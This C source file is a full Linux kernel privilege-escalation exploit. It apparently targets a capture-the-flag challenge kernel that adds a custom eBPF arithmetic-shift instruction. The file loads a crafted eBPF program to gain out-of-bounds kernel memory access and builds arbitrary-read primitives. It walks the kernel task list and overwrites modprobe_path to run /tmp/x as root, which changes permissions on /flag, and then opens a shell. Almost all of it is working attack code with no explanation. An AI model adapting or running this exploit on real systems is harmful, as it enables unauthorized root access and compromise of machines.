#define _GNU_SOURCE
#include <stdio.h>       
#include <stdlib.h>      
#include <unistd.h>      
#include <fcntl.h>       
#include <stdint.h>      
#include <string.h>      
#include <sys/ioctl.h>   
#include <sys/syscall.h> 
#include <sys/socket.h>  
#include <errno.h>       
#include "linux/bpf.h"   
#include "bpf_insn.h"    
#include <sys/types.h>
#include <unistd.h>

#define BPF_ALSH	0xe0	/* sign extending arithmetic shift left */
size_t map,init_task;
int ctrlmapfd, expmapfd;
int progfd;
int sockets[2];
#define LOG_BUF_SIZE 65535
char bpf_log_buf[LOG_BUF_SIZE];

void gen_fake_elf(){
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/x"); 
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");
}
void init(){
    setbuf(stdin,0);
    setbuf(stdout,0);
    gen_fake_elf();
}
void x64dump(char *buf,uint32_t num){         
    uint64_t *buf64 =  (uint64_t *)buf;       
    printf("[-x64dump-] start : \n");         
    for(int i=0;i<num;i++){                   
            if(i%2==0 && i!=0){                   
                printf("\n");                     
            }                                     
            printf("0x%016lx ",*(buf64+i));       
        }                                         
    printf("\n[-x64dump-] end ... \n");       
}                                             
void loglx(char *tag,uint64_t num){         
    printf("[lx] ");                        
    printf(" %-20s ",tag);                  
    printf(": %-#16lx\n",num);              
}                                           
static int bpf_get_info(int fd,void *info,size_t len);


size_t arb_read(size_t addr);
size_t arb_read_4(size_t addr);

size_t get_next_task(size_t task);
size_t get_exp_pid(size_t task);


static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version);      
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries);                                                 
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
static int bpf_lookup_elem(int fd,void *key, void *value);
static void writemsg(void);
static void __exit(char *err);

struct bpf_insn insns[]={
    BPF_LD_MAP_FD(BPF_REG_1,3),

    BPF_ALU64_IMM(BPF_MOV,6,0),
    BPF_STX_MEM(BPF_DW,10,6,-8),
    BPF_MOV64_REG(7,10),
    BPF_ALU64_IMM(BPF_ADD,7,-8),
    BPF_MOV64_REG(2,7),
    BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0,BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE,0,0,1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(9,0),
    
    BPF_LDX_MEM(BPF_DW,6,9,0),
    //BPF_ALU64_IMM(BPF_LSH,6,32),
    //BPF_LDX_MEM(BPF_DW,8,9,0),
    //BPF_ALU64_REG(BPF_ADD,6,8),


    BPF_MOV64_IMM(8,0x1), // smin == 0x1, umin == 0x1
    BPF_ALU64_IMM(BPF_LSH,8,62), 
    
    BPF_JMP_REG(BPF_JLE,6,8,2), 
    BPF_MOV64_IMM(0,0),
    BPF_EXIT_INSN(),

 
    BPF_ALU64_IMM(BPF_ALSH, 6, 2),
    BPF_ALU64_IMM(BPF_AND, 6, 4),
    BPF_ALU64_IMM(BPF_RSH, 6, 2),
    //r6 == offset
    //r9 = inmap
    /*BPF_ALU64_REG(BPF_MUL, 6, 7),*/

    BPF_ALU64_IMM(BPF_MUL,6,0xd0),

    // outmap
    BPF_LD_MAP_FD(BPF_REG_1,4),

    BPF_ALU64_IMM(BPF_MOV,8,0),
    BPF_STX_MEM(BPF_DW,10,8,-8),

    BPF_MOV64_REG(7,10),
    BPF_ALU64_IMM(BPF_ADD,7,-8),
    BPF_MOV64_REG(2,7),
    BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0,
            BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE,0,0,1),
    BPF_EXIT_INSN(),

    BPF_MOV64_REG(7,0),

    BPF_ALU64_REG(BPF_SUB,7,6),

    BPF_LDX_MEM(BPF_DW,8,7,0),
    /*// inmap[2] == map_addr*/
    BPF_STX_MEM(BPF_DW,9,8,0x10),
         
    BPF_ALU64_IMM(BPF_ADD,7,0x38),
    BPF_LDX_MEM(BPF_DW,8,9,0x18),
    BPF_STX_MEM(BPF_DW,7,8,0),

    BPF_LDX_MEM(BPF_DW,8,9,0x8),
    BPF_JMP_IMM(BPF_JNE,8,0,2),
    BPF_ALU64_IMM(BPF_MOV,0,0),
    BPF_EXIT_INSN(),


    BPF_ALU64_IMM(BPF_SUB,7,0x38),
    BPF_LDX_MEM(BPF_DW,8,9,0x20),
    BPF_STX_MEM(BPF_DW,7,8,0), 
    BPF_LDX_MEM(BPF_DW,8,9,0x28),
    BPF_STX_MEM(BPF_DW,7,8,0x10),
    BPF_LDX_MEM(BPF_DW,8,9,0x30),
    BPF_STX_MEM(BPF_DW,7,8,0x18),
    BPF_LDX_MEM(BPF_DW,8,9,0x38),
    BPF_STX_MEM(BPF_DW,7,8,0x20),

    BPF_ALU64_IMM(BPF_MOV,0,0),
    BPF_EXIT_INSN(),
};

void  prep(){
    ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,0x1);
    if(ctrlmapfd<0){ __exit(strerror(errno));}
    expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x2000,0x1);
    if(expmapfd<0){ __exit(strerror(errno));}
    printf("ctrlmapfd: %d,  expmapfd: %d \n",ctrlmapfd,expmapfd);


    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
            insns,sizeof(insns) , "GPL", 0);  
    if(progfd < 0){ __exit(strerror(errno));}
    puts("done");
    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
        __exit(strerror(errno));
    }
    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){ 
        __exit(strerror(errno));
    }
}
char* ctrlbuf;
void pwn(){
    printf("pwning...\n");
    uint32_t key = 0x0;
    ctrlbuf = malloc(0x100);
    char *expbuf  = malloc(0x3000);

    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    uint64_t *expbuf64  = (uint64_t *)expbuf;

    memset(ctrlbuf,'A',0x100);
    for(int i=0;i<0x2000/8;i++){
        expbuf64[i] = i+1;
    }

    ctrlbuf64[0]=0x1;
    ctrlbuf64[1]=0x0;
    ctrlbuf64[3]=0x0;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0); 
    bpf_update_elem(expmapfd,&key,expbuf,0);
    writemsg();
    memset(ctrlbuf,0,0x100);
    bpf_lookup_elem(ctrlmapfd,&key,ctrlbuf);
    map = ctrlbuf64[2];
    init_task = map - 0xffffffff94c0dec0UL + 0xffffffff94e114c0UL;

    printf("%p: %p\n",(void*)map,(void*)(arb_read(map))); 
    printf("%p: %p\n",(void*)init_task ,(void*)(init_task +0x3c0));
     
    size_t mypid = getpid();
    size_t task = init_task;
    for(int i=0;i<0x10;i++){
	size_t test_pid = get_exp_pid(task);
	if( (int)test_pid == (int)mypid )
		break;
	task = get_next_task(task);
    }
    size_t fdbuf = arb_read(arb_read(arb_read(task+0x540)+0x20)+8);
    size_t map_addr = arb_read(arb_read(fdbuf+0x8*expmapfd)+0xc0);
    printf("fdbuf %p\nmap_addr: %p\n",(void*)fdbuf,(void*)map_addr);
    for(int i=0;i<11;i++)
	expbuf64[i] = arb_read(map+i*8);
    expbuf64[10] = expbuf64[4];
    bpf_update_elem(expmapfd,&key,expbuf,0);
    ctrlbuf64[0]=0x1;
    ctrlbuf64[1]=0x1;
    ctrlbuf64[2]=0x0;
    ctrlbuf64[3]=0x0;
    ctrlbuf64[4]=map_addr+0xd0;
    ctrlbuf64[5]=0x0000000400000017UL;
    ctrlbuf64[6]=0xffffffff00002000UL;
    ctrlbuf64[7]=0x0;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    writemsg();

    size_t modprobe = map - 0xffffffffa360dec0UL + 0xffffffffa382e800UL;
    printf("modprobe %p\n", (void*)modprobe);
    char path[] = "/tmp/x";
    int* pathptr = (int*)path;

    expbuf64[0] = pathptr[0]-1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe);
    expbuf64[0] = pathptr[1]-1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe+4);
    system("/tmp/fake");
    system("sh");
}

size_t get_next_task(size_t task){
	return arb_read(task+0x268)-0x260;
}



size_t get_exp_pid(size_t task){
	size_t v6 = arb_read(arb_read(task+0x3c0)+72);
	size_t v4 = arb_read(arb_read(task+0x550) + 360);
	return arb_read(v6*16+v4+80);

}
size_t arb_read(size_t addr){
	size_t ret = arb_read_4(addr+4)<<32;
	return ret+arb_read_4(addr);
}



size_t arb_read_4(size_t addr){
    
    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf; 
    uint32_t key = 0x0;
    ctrlbuf64[0]=0x1;
    ctrlbuf64[1]=0x0;
    ctrlbuf64[3]=addr-0x58;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0); 
    writemsg();
    struct bpf_map_info info = {};
    bpf_get_info(expmapfd,&info,sizeof(info));
    return info.btf_id;

}



int main(int argc,char **argv){
    init();
    prep();
    pwn();
    //while(1) sleep(1);
    return 0;
}


static void __exit(char *err) {              
    fprintf(stderr, "error: %s\n%s\n", err,bpf_log_buf); 
    exit(-1);                            
}                                            
static void writemsg(void) {                                     
    char buffer[64];                                         
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));   
}                                                                


static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version){

    union bpf_attr attr = {                                        
        .prog_type = prog_type,                                
        .insns = (uint64_t)insns,                              
        .insn_cnt = prog_len / sizeof(struct bpf_insn),        
        .license = (uint64_t)license,                          
        .log_buf = (uint64_t)bpf_log_buf,                      
        .log_size = LOG_BUF_SIZE,                              
        .log_level = 1,                                        
    };                                                             
    attr.kern_version = kern_version;                              
    bpf_log_buf[0] = 0;                                            
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));  

}
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries){

    union bpf_attr attr = {                                         
        .map_type = map_type,                                   
        .key_size = key_size,                                   
        .value_size = value_size,                               
        .max_entries = max_entries                              
    };                                                              
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));  

}                                                
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
        .flags = flags,                                              
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));  

}
static int bpf_lookup_elem(int fd,void *key, void *value){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));  
}

static int bpf_get_info(int fd,void *info,size_t len){
    union bpf_attr attr = {                                              
        .info.bpf_fd = fd,                                                
        .info.info_len = (uint64_t)len,                                        
        .info.info = (uint64_t)info,                                    
    };                                                                   
    return syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD , &attr, sizeof(attr));  
}
